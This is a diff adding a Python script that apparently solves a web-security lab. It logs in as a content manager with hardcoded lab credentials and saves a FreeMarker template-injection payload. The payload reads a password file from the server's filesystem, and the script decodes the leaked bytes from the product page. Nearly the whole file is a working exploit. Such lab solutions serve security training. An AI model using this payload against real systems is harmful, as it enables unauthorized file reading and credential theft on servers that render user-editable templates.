@@ -1,0 +1,56 @@
+import re
+import requests
+
+session = requests.session()
+base_url = input("Enter the lab URL: ").strip().rstrip("/")
+
+
+def get_csrf(html):
+    match = re.search(r'name="csrf"[^>]*value="([^"]+)"', html) or \
+            re.search(r'value="([^"]+)"[^>]*name="csrf"', html)
+    return match.group(1) if match else None
+
+
+login_page = session.get(f"{base_url}/login", timeout=10)
+login = session.post(f"{base_url}/login", data={
+    'csrf': get_csrf(login_page.text),
+    'username': 'content-manager',
+    'password': 'C0nt3ntM4n4g3r'
+}, timeout=10)
+
+if login.url.endswith("/login"):
+    print("[*] Login failed. Check the credentials in the lab description.")
+    exit(1)
+print("[*] Logged in as content-manager.")
+
+
+TEMPLATE_URL = f"{base_url}/product/template?productId=1"
+page = session.get(TEMPLATE_URL, timeout=10)
+csrf = get_csrf(page.text)
+if not csrf:
+    print("[*] CSRF token not found on the template page.")
+    exit(1)
+
+
+payload = '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("/home/carlos/my_password.txt").toURL().openStream().readAllBytes()?join(" ")}'
+
+update = session.post(TEMPLATE_URL, data={
+    'csrf': csrf,
+    'template': payload,
+    'template-action': 'save'
+}, timeout=10)
+print(f"[*] Save status: {update.status_code}")
+
+result = session.get(f"{base_url}/product?productId=1", timeout=10)
+sequences = re.findall(r'(?<!\d)(?:\d{1,3} ){4,}\d{1,3}(?!\d)', result.text)
+
+if not sequences:
+    print("[*] No byte sequence found. Check the product page in the browser.")
+    exit(1)
+
+
+for seq in dict.fromkeys(sequences):
+    decoded = ''.join(chr(int(n)) for n in seq.split() if int(n) < 256)
+    print(f"[*] Decoded: {decoded}")
+
+print("[*] Submit the password with the 'Submit solution' button.")
